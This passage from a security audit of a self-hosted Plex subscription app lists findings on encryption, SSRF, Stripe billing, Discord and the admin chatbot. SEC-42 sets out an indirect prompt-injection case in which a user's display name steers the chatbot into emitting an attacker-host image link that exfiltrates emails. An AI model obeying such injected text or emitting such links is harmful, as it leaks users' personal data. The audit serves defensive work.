- **Recommendation:** reuse a stored secret only when the submitted URL has the same origin as the stored row being edited. Otherwise require the secret to be re-entered. Emit an audit event with a redacted diff whenever a URL or credential changes.
- **Effort:** S

#### SEC-32: A lost or rotated `ENCRYPTION_KEY` locks everyone out with no recovery path

- **Severity:** Medium
- **Status:** adjusted
- **Sources:** SEC-INFRA-04
- **Where:** `lib/security/crypto.ts:40`, `:57-58`, `:106-112`, `:119-121`; `lib/prisma.ts:104-111`; `lib/auth.ts:129`, `:196`, `:320`; `actions/admin/admin-settings.ts:55-62`; `actions/admin/admin-servers.ts:82`, `:110-114`; `example.env:19-21`; `README.md:273`
- **Evidence:**
  - **Hard failures:** `decryptSecret` throws "Encountered an encrypted secret but ENCRYPTION_KEY is not set". With a wrong key, `decipher.final()` throws.
  - **No containment:** `decryptRow` runs on every result with no try/catch.
  - **Every critical path reads full rows:** login (PlexServer, User), the settings page, and the update actions, which read the stored row inside their transaction.
  - **No rotation support:** the format `enc:v1:` has no key id, and only one key is ever loaded.
  - **Wrong docs:** the docs say rotation "makes previously-encrypted secrets undecryptable until they are re-saved".
- **Impact:** losing or changing the key (a redeploy without the env var, a typo, an attempted rotation) is a full outage. Nobody can sign in, the settings page throws, and the documented re-save recovery cannot run. Recovery needs manual SQL.
- **Verifier correction:** medium, not high. The precondition is operator error, and secrets are inherently unrecoverable without the key. The defect is the global hard failure plus the misleading docs.
- **Recommendation:**
  - Make `decryptRow` fail soft per field: null the field, log once, and show "stored secret unreadable, re-enter it" in admin.
  - At boot, decrypt a canary value and fail with a clear error on a key mismatch.
  - Fix `example.env` and the README.
  - Optional follow-up (M): an `ENCRYPTION_KEYS` keyring (`enc:v2:<kid>:`) plus a re-encryption script.
- **Effort:** S (fail-soft); M with the keyring

#### SEC-33: At-rest encryption is opt-in, silently off by default, and key handling is not hardened

- **Severity:** Low
- **Status:** adjusted
- **Sources:** SEC-INFRA-05
- **Where:** `lib/security/crypto.ts:19-22`, `:58`, `:72`, `:80-84`, `:87`, `:102-104`, `:119`; `example.env:22`; `docker-compose.yml:19-24`
- **Evidence:**
  - **No-op without a key:** `encryptSecret` "is a no-op when `ENCRYPTION_KEY` is unset".
  - **Not set anywhere by default:** the key appears only as a commented line in `example.env:22` and is absent from compose.
  - **Nothing reports the state:** `isEncryptionConfigured()` has zero call sites.
  - **Weak key handling:** the key is derived as `crypto.createHash("sha256").update(raw, "utf8").digest()`, with no length or entropy check.
  - **Tag length not enforced:** `createDecipheriv` does not pass `{ authTagLength: 16 }`.
  - **Old rows stay plaintext:** existing plaintext rows are encrypted only when next written.
- **Impact:** default and documented deployments store the Plex owner token, every user's Plex token, the Stripe secret, the Discord bot token and the service keys in plaintext. A DB dump or leaked backup exposes all of them, and admins cannot see that encryption is off. A weak key string such as "changeme" yields a guessable key.
- **Verifier correction:** low (hardening). Encryption with the key stored in the same environment is defence in depth. AAD and HKDF add little, because unprefixed values already pass through as plaintext.
- **Recommendation:**
  - Require a 32-byte random `ENCRYPTION_KEY` (hex or base64) in production, distinct from `NEXTAUTH_SECRET`, through the SEC-09 env schema.
  - Show encryption status in admin settings via `isEncryptionConfigured()`.
  - Pass `{ authTagLength: 16 }` (Node DEP0182) and reject payloads shorter than 28 bytes.
  - Ship a one-off script that re-saves existing plaintext secrets.
- **Effort:** M

#### SEC-34: Bearer tokens and PII stored in plaintext beyond ENCRYPTED_FIELDS, with no retention policy

- **Severity:** Low
- **Status:** adjusted
- **Sources:** SEC-INFRA-17 (the email-fallback part is in SEC-16)
- **Where:** `prisma/schema.prisma:179-180`, `:202-203`, `:236-237`, `:331`, `:347`, `:395`; `lib/auth.ts:205`, `:229`; `lib/queue/jobs/stripe.ts:461-465`
- **Evidence:** these columns are stored in plaintext with no TTL or cleanup:
  - `PlexWrapped.shareToken` (looked up by equality, so it could be stored as a hash)
  - `Invite.code`
  - `DiscordOAuthState.codeVerifier`
  - `LLMUsage.prompt` / `response` (full viewing histories)
  - `DiscordChatSession.messages`
  - `WrappedShareVisit.userAgent` / `referer`

  `plexAuthToken` is stored on every Plex login.
- **Impact:** a DB leak exposes working share links, invite codes and detailed viewing histories.
- **Verifier corrections:**
  - `User.plexAuthToken` is in ENCRYPTED_FIELDS, so the "Plex token for every user" exposure applies only when the key is unset (SEC-33).
  - The token is also needed to auto-accept Stripe and comp invites, not only for watchlist sync.
  - Hashing invite codes would break the admin list, which re-displays `invite.code`.
- **Recommendation:**
  - Add retention or TTL cleanup for LLMUsage prompt/response, DiscordChatSession and expired OAuth states, and consider encrypting the LLMUsage text.
  - Hash `shareToken`; regenerating the token to show the link again is acceptable.
  - Clear `plexAuthToken` once neither watchlist sync nor a pending grant needs it.
- **Effort:** M

### 7. SSRF and outbound requests

#### SEC-35: Unauthenticated SSRF via `'use server'` Jellyfin helpers that take the target URL and key from the caller

- **Severity:** Medium
- **Status:** adjusted
- **Sources:** AUTH-06, WEB-05
- **Where:** `lib/jellyfin-auth.ts:5`, `:13`, `:32-42`, `:66`, `:136`, `:149`; `lib/connections/jellyfin-users.ts:243-248`, `:284-294`; `lib/utils/fetch-with-timeout.ts:41`
- **Evidence:**
  ```ts
  "use server"                                                         // lib/jellyfin-auth.ts:5
  interface JellyfinConfig { url: string; apiKey: string }             // from the caller
  export async function authenticateJellyfin(jellyfinConfig: JellyfinConfig, username, password)   // :66
  export async function isJellyfinAdmin(jellyfinConfig, userId, ...)                               // :136
  fetchWithTimeout(`${config.url}/Users/AuthenticateByName`, { method: "POST", ... })              // jellyfin-users.ts:284
  ```
  - **Unrestricted target:** there is no session check, no URL validation and no private-network guard, and redirects are followed.
  - **Error oracle:** errors leak `Authentication failed: ${response.statusText}`.
  - **Registered as actions:** the dev server-reference-manifest registers both functions.
- **Impact:** anyone with the action ID can make the server send GET and POST requests to arbitrary hosts and paths. A trailing `?` cancels the appended path. That allows port and service scanning of LAN-only homelab services, blind POSTs to internal endpoints, and brute-forcing an internal-only Jellyfin.
- **Verifier corrections:**
  - The action IDs appear in 0 client chunks, and Next 15+ IDs are per-build. The IDs have to be read from a built image (the GHCR image is public) or disclosed by GHSA-955p, which is unconfirmed. Hence medium, with medium confidence.
  - `/_next/image` does not reach internal hosts directly, because the private-IP guard is on by default (DNS rebinding is in SEC-01).
  - `fetchLLMModels` is not SSRF (SEC-19).
- **Recommendation:**
  - Remove `'use server'` from `lib/jellyfin-auth.ts` and add `import "server-only"`; only `lib/auth.ts` calls it.
  - Audit `lib/plex-auth.ts` and `lib/guards.ts` the same way.
  - Exported actions must load connection config from the DB, never take it as an argument.
  - For admin and setup connection tests, add an outbound policy: http/https only, `redirect: 'manual'`, generic errors.
- **Effort:** S

#### SEC-36: Outbound service clients follow redirects carrying custom auth headers, put secrets in query strings, and often have no timeout

- **Severity:** Low
- **Status:** adjusted
- **Sources:** WEB-15, SEC-INFRA-08 (query-string token part)
- **Where:** `lib/utils/fetch-with-timeout.ts:41-44`; `lib/connections/plex-connection.ts:18`, `:56`; `lib/connections/tautulli.ts:54`, `:71`, `:101`; `lib/connections/plex-marking.ts:21`, `:69`; `lib/connections/overseerr.ts:56`; `lib/connections/plex-sessions.ts:29`, `:49`; `lib/wrapped/server-statistics.ts:35`, `:73`, `:106`; `actions/server-info.ts:55-57`; `lib/connections/plex-search.ts:30`
- **Evidence:**
  - **Redirects:** `fetchWithTimeout` calls `fetch(url, { ...fetchOptions, signal: controller.signal })` with no `redirect` option, and no `redirect: "manual"` exists anywhere. undici strips only authorization, proxy-authorization, cookie and host on cross-origin redirects.
  - **Query-string secrets:** 31 URLs interpolate `X-Plex-Token=${...}` or `apikey=${...}`.
  - **No timeouts:** bare `fetch(` calls appear in `tautulli.ts` (13), `overseerr.ts` (9) and `plex-invitations.ts` (4).
  - **Token in error text:** Node's error for an unparseable URL includes the full URL with the token, and `plex-sessions.ts:49` returns `Error fetching ${noun}: ${error.message}`.
- **Impact:**
  - `X-Api-Key`, `X-Emby-Token` and `X-Plex-Token` follow off-origin redirects, for example to a forward-auth SSO in front of Sonarr.
  - Tokens in query strings land in proxy and Plex access logs.
  - Bare fetches can tie up a request for up to about 5 minutes (undici's 300 s defaults).
- **Verifier corrections:** about 20 of the 31 are Tautulli `apikey=`, which Tautulli's API requires in the query; only about 11 Plex cases can move to a header. The bare fetches do not hang forever.
- **Recommendation:** default `fetchWithTimeout` to `redirect: 'manual'` (or `'error'`) and route the bare fetches through it. Send the Plex token in the `X-Plex-Token` header, and build URLs with `URL` and `URLSearchParams`.
- **Effort:** M

### 8. Billing (Stripe)

#### SEC-37: Stripe handlers apply stale event snapshots unconditionally on a 5-way concurrent worker; out-of-order events can bring a canceled subscription back

- **Severity:** Medium
- **Status:** confirmed
- **Sources:** ST-02
- **Where:** `lib/queue/jobs/stripe.ts:4-7`, `:222-230`, `:252-259`, `:294`, `:308-311`, `:339-340`; `lib/queue/worker.ts:30`; `lib/queue/types.ts:73-78`
- **Evidence:**
  ```ts
  // Re-fetch the event so we act on Stripe's current truth.
  const event = await stripe.events.retrieve(eventId)        // :339-340, returns the creation-time snapshot
  return 5 // Default concurrency                              // worker.ts:30
  ```
  - **Unconditional writes:** `handleSubscriptionUpdated` writes status with `updateMany` and no ordering check, and enqueues a grant when the status is ACTIVE. `handlePaymentFailed` always sets `PAST_DUE`.
  - **No ordering data:** nothing compares `event.created`.
  - **Misleading comment:** the "current truth" comment above is wrong.
- **Impact:** if a delayed `customer.subscription.updated(active)` is processed after `customer.subscription.deleted`, CANCELED flips back to ACTIVE and a non-paying user gets Plex access again. The `payment_failed` half is mostly cosmetic: `PAST_DUE` is still entitled and protected from revoke.
- **Recommendation:** in each subscription handler, call `stripe.subscriptions.retrieve(id)` and write the live status, or persist `lastEventCreatedAt` and ignore older events. Fix the comments.
- **Effort:** S

#### SEC-38: `PLEX_ACCESS_REVOKE` and `GRANT` jobs act without re-validating live subscription state

- **Severity:** Medium
- **Status:** adjusted
- **Sources:** ST-01
- **Where:** `lib/queue/jobs/stripe.ts:143-147`, `:182-193`, `:249-250`, `:406-494`, `:536-550`, `:605`, `:632-635`; `actions/admin/queue.ts:322-362`; `lib/queue/client.ts:21-33`
- **Evidence:**
  - **The revoke guard never requires a terminal status:** `evaluateRevokeGuard` ends with `if (target.status === SubscriptionStatus.PAST_DUE) { return "subscription is past due" } return null`. It never requires CANCELED or UNPAID before the job calls `unshareUserFromPlexServer`.
  - **The grant job checks nothing:** `processPlexAccessGrant` checks neither entitlement nor existing access.
  - **The comment is wrong:** the grant is enqueued on every ACTIVE update under the comment "The grant job is idempotent and no-ops if access already exists", which is false.
- **Impact:** an admin who manually retries an old failed revoke unshares a subscriber who has since resubscribed and is ACTIVE. Every monthly renewal re-POSTs a `shared_servers` invite, which leaves failed jobs that never update `plexInviteStatus`.
- **Verifier corrections:** automatic retries end within about 35 seconds, and a stale revoke for an old subscription id finds no row. In practice, the wrongful unshare comes from a manual retry or from SEC-37. The claim that renewals "overwrite admin library customisations" is speculative.
- **Recommendation:**
  - In the revoke job, re-read the status (or retrieve it from Stripe) and proceed only on CANCELED or UNPAID, with a test.
  - In the grant job, skip when the user is not entitled (ACTIVE/TRIALING or `isExempt`) or already has access (`checkUserServerAccess`).
  - Enqueue a grant only on a transition from a non-entitled status, and fix the comment.
- **Effort:** S

#### SEC-39: `startCheckout` lets an already-subscribed user create a second subscription and a new Stripe customer

- **Severity:** Medium
- **Status:** confirmed
- **Sources:** ST-04
- **Where:** `actions/subscription.ts:61-115`, `:145-163`; `lib/stripe/checkout.ts:70-86`; `lib/queue/jobs/stripe.ts:92-111`; `app/subscribe/page.tsx:25-48`
- **Evidence:**
  - **No existing-subscription check:** `startCheckout` never checks for an existing ACTIVE or PAST_DUE subscription.
  - **A new customer every time:** `createCheckoutSession` sets `customer_email` but never `customer: existingStripeCustomerId`.
  - **The old IDs are lost:** the webhook upsert overwrites `stripeCustomerId` and `stripeSubscriptionId` on the single per-user row.
  - **Plans shown to subscribers:** `/subscribe` renders plans for any signed-in user.
- **Impact:** a user who completes a second checkout is double-charged. The older subscription disappears from the app and from the Billing Portal the app opens, so the user cannot cancel it there, and its later `deleted` event matches no row. This means support load and chargeback risk.
- **Recommendation:**
  - Reject `startCheckout`, and redirect `/subscribe` to the portal, when the user already has an ACTIVE or PAST_DUE subscription.
  - Pass `customer: subscription.stripeCustomerId` when one exists.
  - Consider reconciling via `stripe.subscriptions.list({ customer })`.
- **Effort:** S

#### SEC-40: A Stripe event is recorded as seen before processing succeeds, so events that failed cannot be recovered with Stripe's resend

- **Severity:** Medium
- **Status:** adjusted
- **Sources:** ST-05
- **Where:** `lib/queue/jobs/stripe.ts:342-348`; `app/api/stripe/webhook/route.ts:80-93`; `lib/queue/client.ts:31-33`
- **Evidence:**
  - **Recorded first:** `prisma.stripeEvent.upsert({ where: { id: event.id }, create: { id: event.id, type: event.type }, update: {} })` runs before dispatch.
  - **Later deliveries short-circuit:** the route returns early with `if (existing) { ... return NextResponse.json({ received: true, duplicate: true }) }`.
  - **Stripe won't retry on its own:** the route already returned 200 at enqueue time.
  - **BullMQ also ignores the resend:** the job is enqueued with `jobId = event.id`, and failed jobs are kept for 7 days.
- **Impact:** if a handler fails all 3 attempts (DB, Redis, or Stripe API errors), local state silently diverges from Stripe. The Stripe dashboard's "Resend event" is dropped as a duplicate, so the only recovery is a manual queue retry within 7 days, and nothing alerts on it.
- **Verifier corrections:** Plex is not on this job's path. The fix must also deal with BullMQ `jobId` dedupe, not just the `StripeEvent` row.
- **Recommendation:**
  - Record `processedAt` only after the handler succeeds, and dedupe in the route only on processed events.
  - On a resend of an unprocessed event, retry or remove the failed job, or enqueue under a fresh `jobId`.
  - Alert on failed `STRIPE_WEBHOOK` jobs, and add periodic reconciliation.
- **Effort:** S

#### SEC-41: `checkout.session.completed` trusts `client_reference_id` and hard-codes ACTIVE without checking mode, payment status or price

- **Severity:** Low
- **Status:** adjusted
- **Sources:** ST-03
- **Where:** `lib/queue/jobs/stripe.ts:52-54`, `:86-87`, `:96`, `:103`, `:118`; `lib/stripe/checkout.ts:70-79`; `actions/subscription.ts:78-89`
- **Evidence:**
  - **Trusted identity:** the app user is resolved with `return session.client_reference_id ?? session.metadata?.appUserId ?? null`.
  - **Hard-coded status:** the handler retrieves the subscription but upserts `status: SubscriptionStatus.ACTIVE` and enqueues a Plex grant.
  - **Unchecked fields:** it never checks `session.mode`, `payment_status`, `subscription.status`, or whether the price is in `Config.stripePriceIds`.
  - **Unhandled event:** `async_payment_failed` is not handled.
- **Impact:** if the Stripe account has another Checkout integration or a Payment Link (Payment Links accept `?client_reference_id=`), anyone can pay for an unrelated product with their own app user id and be marked ACTIVE. A one-time payment yields a null subscription id, which the revoke guard treats as not Stripe-managed, so that access is never revoked. Delayed payment methods are granted before the money arrives.
- **Verifier correction:** low. The app's own flow always uses subscription mode with a price validated on the server; abuse needs operator setups this app does not create.
- **Recommendation:** ignore sessions that are not subscription mode or not paid / `no_payment_required`. Derive the status with `mapStripeStatus(subscription.status)`, check the price allowlist, and handle `async_payment_succeeded` and `async_payment_failed`.
- **Effort:** S

### 9. AI assistant and Rewind pipeline

#### SEC-42: The admin chatbot is exposed to indirect prompt injection from user-controlled tool data, and renders model markdown images that can exfiltrate data

- **Severity:** Medium
- **Status:** confirmed
- **Sources:** AI-03
- **Where:** `components/admin/chatbot/chat-window.tsx:181-205`; `next.config.js:53`; `actions/chatbot/executors/overseerr.ts:51-54`; `lib/connections/overseerr.ts:102-109`; `actions/chatbot/conversation.ts:140-153`; `actions/chatbot/index.ts:23-25`
- **Evidence:**
  - **Tool output reaches the model unscrubbed:** admin-context results are appended raw (`content: result`). Only the Discord context is scrubbed.
  - **User-editable fields are included:** `get_overseerr_users` returns the full `/api/v1/user` JSON, including the user-editable `displayName` and emails.
  - **Images are not filtered:** `<ReactMarkdown components={{ p, ul, ol, li, strong, em, code, h1, h2, h3, blockquote }}>` has no `img` or `a` override.
  - **The CSP allows remote images:** it permits `img-src 'self' data: https:`.
- **Impact:** a regular user sets their Overseerr display name to an instruction payload. When an admin asks the chatbot about users, the model may emit `![](https://attacker/?d=<emails>)`, which the admin's browser fetches automatically, leaking PII. It can also emit convincing phishing links in the admin context. The attack is probabilistic, and the chatbot is admin-only.
- **Recommendation:**
  - Render with `disallowedElements={['img']}` (or an `img` override that drops remote sources) and an `a` override that shows the full URL with `rel="noopener noreferrer"`.
  - Wrap tool output in delimited "untrusted data" blocks, and tell the model never to follow instructions found in it.
  - Project tool output down to the fields actually needed (no emails), and tighten CSP `img-src`.
- **Effort:** S

#### SEC-43: The Rewind generation pipeline runs synchronously in a server action, has no repair or retry on schema failure, and fails the whole Rewind on one bad LLM response

- **Severity:** Medium
- **Status:** adjusted (the verifier says the auditor under-rated it)
- **Sources:** AI-08
- **Where:** `actions/wrapped-generation.ts:3-5`, `:163-341`, `:342-351`, `:376-392`, `:401-451`; `lib/wrapped/api-calls.ts:20-22`, `:111-119`, `:186-218`; `lib/wrapped/parse-llm-output.ts:3-6`; `lib/wrapped/llm.ts:112-114`, `:127-147`; `components/dashboard/wrapped-card.tsx:98-128`
- **Evidence:**
  - **Inline execution:** the stats fetches and the LLM call run inside the request.
  - **No retry or repair:** on truncation (`finishReason === "length" || isIncompleteJson`) or a Zod failure, `callOpenAI` returns an error with no retry or repair. The module says it "Fails loudly ... no silent degradation".
  - **Whole Rewind fails:** the row is marked failed and the raw message is stored.
  - **Bulk generation is serial:** `generateAllPlexWrapped` runs every user's full pipeline one after another inside a single admin action.
- **Impact:**
  - For the year-end Rewind push, inline generation risks reverse-proxy read timeouts (typically 60 to 100 s; the header's Vercel numbers do not apply to a self-hosted app), duplicate concurrent runs (SEC-22) and Tautulli overload.
  - `generateAllPlexWrapped` will hit the proxy timeout at any real user count. It keeps running unseen, and a second click starts a parallel loop.
  - A single malformed response forces a manual retry, and failed attempts are invisible in cost tracking (SEC-23).
- **Mitigation:** strict `json_schema` structured outputs are already used where supported, and single-user generation partly recovers through status polling.
- **Recommendation:**
  - Move per-user generation into a BullMQ job with `jobId` `rewind:{userId}:{year}`, bounded concurrency and exponential backoff. The action only enqueues; the UI already polls.
  - Rebuild bulk generation as a fan-out enqueue with per-job progress.
  - Split the work into a cached deterministic statistics stage and the creative LLM stage.
  - On a schema failure, make one repair call that sends back the Zod issues, then fall back per section to deterministic copy (start from `lib/wrapped/mock-data.ts`).
  - Show users generic errors, and pair the work with SEC-44.
- **Effort:** M

#### SEC-44: Two duplicated, hand-rolled OpenAI clients detect model capabilities by name prefix, which is brittle for newer models and OpenAI-only

- **Severity:** Medium
- **Status:** adjusted
- **Sources:** AI-04
- **Where:** `lib/llm/chat.ts:6`, `:61-69`, `:96`, `:100`; `lib/wrapped/api-calls.ts:20-22`, `:49-57`, `:63-72`, `:124-126`; `actions/chatbot/conversation.ts:62`; `lib/chatbot/assistant.ts:62`; `lib/wrapped/llm.ts:93-110`; `actions/chatbot/tools/types.ts:8-9`
- **Evidence:**
  - **Copied prefix check:** `requiresMaxCompletionTokens` is copied into both files and matches only `gpt-5`, `o1` and `o3`, so o4-* models are sent `max_tokens`.
  - **More prefix guessing:** `supportsStructuredOutputs` is another prefix list.
  - **Temperature:** it is sent whenever an admin has configured it, even for reasoning models.
  - **Divergent timeouts:** 30 s for chat, 300 s for Rewind.
  - **OpenAI hard-coded:** `provider: "openai"` and `llmProvider.provider === "openai"`.
  - **Tool metadata passed through:** registry metadata is sent on the assumption that OpenAI ignores unknown properties.
- **Impact:** upgrading the Rewind or chat model (a stated owner goal) can fail with 400 errors, every model family needs edits in two places, and Anthropic or Gemini models cannot generate a Rewind.
- **Verifier corrections:** the tool-metadata risk is speculative, since the chatbot works today. Temperature is only a misconfiguration footgun.
- **Recommendation:** consolidate into one provider module (or an SDK) with a single capability table per model and shared timeout and retry config. Always send `max_completion_tokens`, strip registry metadata from tools, and make `LLMProvider.provider` a real switch.
- **Effort:** M

#### SEC-45: `chatWithAdminBot` accepts an unvalidated client message history (including `system` roles) and an unowned `conversationId`; LLMUsage re-stores the full context on every loop

- **Severity:** Low
- **Status:** confirmed
- **Sources:** AI-07
- **Where:** `actions/chatbot/index.ts:12-38`; `actions/chatbot/conversation.ts:42-44`, `:86-100`; `lib/chatbot/assistant.ts:76-82`
- **Evidence:**
  - **Minimal check:** the action only checks that the last message has role `user`; there is no Zod schema and no limit on count or length.
  - **Roles are cast, not validated:** `role: m.role as "user" | "assistant"` lets `system` entries through.
  - **No ownership check:** `conversationId` is used as given.
  - **Repeated full storage:** each loop writes `prompt: JSON.stringify(currentMessages)`, and no LLMUsage cleanup exists.
- **Impact:** the caller is admin-only, so there is no privilege escalation. The admin client can override the system prompt and send arbitrarily large histories, which costs money. LLMUsage rows grow roughly quadratically and keep PII from tool output indefinitely.
- **Recommendation:** validate input with Zod (roles `user`/`assistant`, bounded count and length) and verify conversation ownership. Store only the delta or an excerpt in LLMUsage, and add retention (SEC-34).
- **Effort:** S

#### SEC-46: Prompt placeholder substitution interprets `$` patterns in user and media strings

- **Severity:** Low
- **Status:** confirmed
- **Sources:** AI-06
- **Where:** `lib/wrapped/prompt-template.ts:34`, `:51-53`, `:194`, `:199`
- **Evidence:**
  - **The substitution:** `result.replace(new RegExp(placeholder.replace(/[{}]/g, "\\$&"), "g"), value)` passes `value` as a replacement string.
  - **Reproduced in Node:** replacing `{{userName}}` with ``Ca$$h $& $'`` yields `Hello Ca$h {{userName}} , end, end`.
- **Impact:** a title or display name containing `$$`, `$&`, `` $` `` or `$'` duplicates or garbles the admin's own prompt text in the LLM input. This is rare; a name such as "Ke$ha" is unaffected.
- **Recommendation:** use a replacer function (`() => value`), or a single pass with `/\{\{(\w+)\}\}/g` and a lookup map, which also removes the order-dependent second pass for `serverName`.
- **Effort:** S

### 10. Discord and watchlist integrations

#### SEC-47: Discord linked-role metadata is synced only at link time or on manual resync, so subscriber roles persist after access is revoked

- **Severity:** Medium
- **Status:** confirmed
- **Sources:** DC-03
- **Where:** `lib/discord/integration.ts:208`, `:287`, `:310`; `actions/discord.ts:158`, `:178`; `lib/discord/role-metadata.ts:79-105`; `lib/queue/jobs/stripe.ts:572-652`
- **Evidence:**
  - **Two call sites only:** `syncDiscordRoleConnection` is called from `completeDiscordLink` and the user-triggered `resyncDiscordRole`.
  - **Cleared only on unlink:** `clearDiscordRoleForUser` runs only when the user unlinks.
  - **Revoke doesn't touch it:** `processPlexAccessRevoke` neither re-syncs nor clears the role.
  - **Nothing catches stale rows:** no scheduled job reads `metadataSyncedAt`.
- **Impact:** guild channels gated on the linked role stay open, indefinitely, to users whose subscription ended or who were removed from Plex. Newly granted users don't get the role until they resync. The bot's own features check entitlement live. Separately, `platform_username` falls back to `user.email`, which pushes the member's email to Discord.
- **Recommendation:** after grant or revoke, status changes, exempt toggles and removals, enqueue a deduplicated role-sync job per user. Add periodic reconciliation for stale `metadataSyncedAt`, and stop using email as `platform_username`.
- **Effort:** M

#### SEC-48: "Mark finished" (Discord `/mark` and the chatbot tool) scrobbles on the server owner's Plex account, not the member's

- **Severity:** Medium
- **Status:** confirmed
- **Sources:** DC-04
- **Where:** `lib/discord/media/mark-media.ts:166-177`; `lib/connections/plex-marking.ts:21`; `lib/discord/commands/mark/index.ts:373`; `actions/chatbot/executors/media-marking.ts:46-48`; `actions/chatbot/tools/media-marking.ts:4-24`; `lib/connections/plex-config.ts:32-44`
- **Evidence:**
  - **The owner's token is used:** `markPlexItemWatched(plexConfig, item.ratingKey)` builds `${config.url}/:/scrobble?...&key=${ratingKey}&X-Plex-Token=${config.token}`, using the active PlexServer owner token.
  - **The command promises otherwise:** it advertises "also marks watched in Plex".
  - **The model can call it:** `mark_media_finished` is `discordSafe: true` and takes the first search hit.
- **Impact:** any linked member, or a prompt-injected assistant turn, can mark arbitrary items as watched on the owner's account. That corrupts the owner's history, On Deck and Continue Watching. The member's own watched state never changes. The damage can be undone with unscrobble.
- **Recommendation:** scrobble with the member's own `plexAuthToken`, or drop the Plex side effect and update the command text. Consider requiring confirmation before LLM-initiated write tools run in the Discord context.
- **Effort:** S

#### SEC-49: Legacy (no-Redis) watchlist polling never starts if sync is disabled at boot, and once initialised never syncs again

- **Severity:** Medium
- **Status:** confirmed
- **Sources:** WL-02
- **Where:** `lib/watchlist/lock.ts:281-297`, `:333-346`, `:353-354`; `lib/instrumentation/node.ts:118-138`
- **Evidence:**
  - **Disabled at boot means never:** `node.ts:118-122` returns before polling starts when sync is disabled. `lock.ts:286-297` has a second latent copy of the bug: it sets `isPolling = true` and then returns early.
  - **Ticks don't sync:** once the lock is held, each tick returns at `:333-346`.
  - **One sync per lock:** `syncAllEnabledUsers` runs only from `onLockAcquired`, so `watchlistSyncIntervalMinutes` is ignored.
- **Impact:** without Redis, which the README documents as optional, watchlist sync runs once per process lifetime. It never starts if it was disabled at boot, users see stale "last synced" times, and requests stop flowing.
- **Recommendation:** either require Redis and drop the legacy path, or always create the interval and call `syncAllEnabledUsers` on each tick while holding the lock, reusing the shared lock (SEC-52).
- **Effort:** S

#### SEC-50: The Discord privacy firewall fails open: unscoped Tautulli activity fallback, and executor exceptions bypass `scrubForDiscord`

- **Severity:** Low
- **Status:** adjusted
- **Sources:** DC-01
- **Where:** `actions/chatbot/executors/tautulli.ts:36-110`; `actions/chatbot/executors/index.ts:158`, `:169-181`; `actions/chatbot/tools/tautulli.ts:17-47`; `actions/chatbot/executors/plex.ts:28-62`
- **Evidence:**
  - **Activity falls through unfiltered:** if `getTautulliUsers` fails, returns no data, or finds no match, execution reaches `return JSON.stringify(activity)` with the full unfiltered sessions.
  - **The tool metadata says otherwise:** it is flagged `userScoped: true` with the comment "Sessions are filtered to the caller upstream".
  - **Errors skip the scrubber:** the `catch` returns `Error executing tool: ${error.message}` without running `scrubForDiscord`.
- **Impact:** when the lookup misses, a member asking "what's playing?" sees other sessions' titles, platform, progress and quality.
- **Verifier corrections:**
  - The leaked data is anonymous: user, `user_id`, IP and machine fields are scrubbed.
  - Output only goes to the requester (DMs, or an ephemeral `/assistant` reply), never a public channel.
  - A miss needs a user Tautulli has not imported yet, or a transient failure.
- **Recommendation:** in the Discord branch, return an empty session list whenever the caller can't be positively mapped. Return a fixed generic error for the Discord context, and add tests. `get_plex_sessions` already fails closed and is a good template.
- **Effort:** S

#### SEC-51: Assistant replies are sent to Discord without truncating to the 2000-character limit

- **Severity:** Low
- **Status:** confirmed
- **Sources:** DC-05
- **Where:** `lib/discord/routing/dm-router.ts:200-210`; `lib/discord/commands/assistant.ts:110-112`; `lib/discord/services.ts:196-209`; `lib/discord/discord-system-prompt.ts:9`, `:19`
- **Evidence:**
  - **Sent as-is:** the DM path sends `await message.reply({ content: response.message.content, ... })`, and the slash path sends `` content: `${response.message.content}${CONTINUE_IN_DM_NOTE}` ``.
  - **No length cap:** `sanitizeDiscordResponse` does not limit length.
- **Impact:** Discord rejects long answers. The user sees "Sorry, I couldn't reach the assistant" even though the turn was persisted and billed. The system prompt asks for short answers, which reduces how often this happens.
- **Recommendation:** add a shared `fitDiscordContent(text, limit = 2000)` helper (truncate with an ellipsis, or split into follow-up messages) and use it on both paths. Cap `max_tokens` for the Discord context.
- **Effort:** S

#### SEC-52: The watchlist sync lock is a near-verbatim copy of the old Discord lease lock instead of reusing `DistributedLock` / `BotLockPoller`

- **Severity:** Low
- **Status:** confirmed
- **Sources:** WL-03
- **Where:** `lib/watchlist/lock.ts:55-58`, `:65-168`, `:173-245`, `:276-360`; `lib/discord/lock/lease.ts:28`, `:49-53`, `:84-221`; `lib/discord/lock/poller.ts:38-45`, `:56-62`, `:98-100`, `:173-177`; `prisma/schema.prisma:289-299`, `:640-650`
- **Evidence:**
  - **Same logic, different tables:** acquire, renew and release follow the same transaction steps as `DistributedLock`, differing only in table and id. The Prisma models are identical.
  - **The design Discord removed:** the watchlist path keeps module-global state plus its own renewal timer, the "two-timer" design that the Discord refactor removed.
  - **Missing guard:** it lacks the poller's `ticking` overlap guard.
- **Impact:** bugs fixed in one lock persist in the other (including SEC-49), doubling the test surface. This is in scope for the deduplication plan.
- **Recommendation:**
  - Generalise `DistributedLock` with a lock id and a lease-store adapter, or use a single `LeaseLock` table keyed by name. Make the poller's config-version bounce optional, and drive the legacy fallback through it.
  - Or, if Redis becomes mandatory, delete the legacy lease and poller code and keep only `isWatchlistSyncEnabled` and `getWatchlistSyncInterval`.
- **Effort:** S

### 11. Web hardening, validation and logging

#### SEC-53: The CSP offers almost no XSS protection; some security headers are deprecated or overly broad

- **Severity:** Low
- **Status:** adjusted
- **Sources:** WEB-11, SEC-INFRA-16
- **Where:** `next.config.js:28-29`, `:32-33`, `:40-41`, `:44-45`, `:52-53`; `proxy.ts:47-52`
- **Evidence:**
  ```
  default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline'; style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' https:;
  Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
  X-XSS-Protection: 1; mode=block
  ```
  The CSP sets no `object-src`, `base-uri` or `form-action`. `poweredByHeader` is not disabled.
- **Impact:** any XSS can run inline script and exfiltrate through `connect-src` or `img-src` (which matters for SEC-42). The headers fingerprint the framework, and HSTS preload is a commitment the operator never chose.
- **Verifier corrections:**
  - Browsers ignore HSTS received over plain HTTP. `includeSubDomains` only covers subdomains of the host that sends it, and `preload` does nothing until the domain is submitted to the preload list.
  - `X-Frame-Options: SAMEORIGIN` covers framing.
  - No XSS sink exists (no `dangerouslySetInnerHTML`, no `rehype-raw`).
- **Recommendation:**
  - Add `object-src 'none'`, `base-uri 'self'`, `form-action 'self'` and `frame-ancestors 'self'`, and drop `'unsafe-eval'` outside development.
